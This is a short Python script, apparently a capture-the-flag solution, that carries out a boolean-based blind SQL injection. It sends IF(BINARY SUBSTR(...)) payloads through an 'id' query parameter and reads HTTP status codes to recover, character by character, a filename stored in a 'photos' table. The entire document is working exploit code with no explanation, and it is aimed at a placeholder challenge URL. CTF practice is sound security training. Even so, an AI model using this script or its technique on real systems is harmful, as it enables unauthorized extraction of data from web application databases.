import requests

tested_chars = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ_-,.!/^#$ "
# This needs to be changed to your challenge instance
url = "http://add.your.ip.address/containertag/fetch"


def get_blind_query(query):
    print(f"Performing blind query: {query}")
    pos = 1
    go_on = True
    while go_on:
        correct = False
        for letter in tested_chars:
            id = single_query(query, pos, letter)
            r = requests.get(url, params={"id": id})
            correct = r.status_code == 200
            if correct:
                print(letter, end='')
                pos += 1
                break
        go_on = correct
    print()


def single_query(query, pos, letter):
    return f"IF(BINARY SUBSTR(({query}), {pos}, 1) = '{letter}', 1, 4);--"


def main():
    query = f"SELECT filename FROM photos WHERE id=3"
    get_blind_query(query)
    print("\nDone.")


if __name__ == '__main__':
    main()
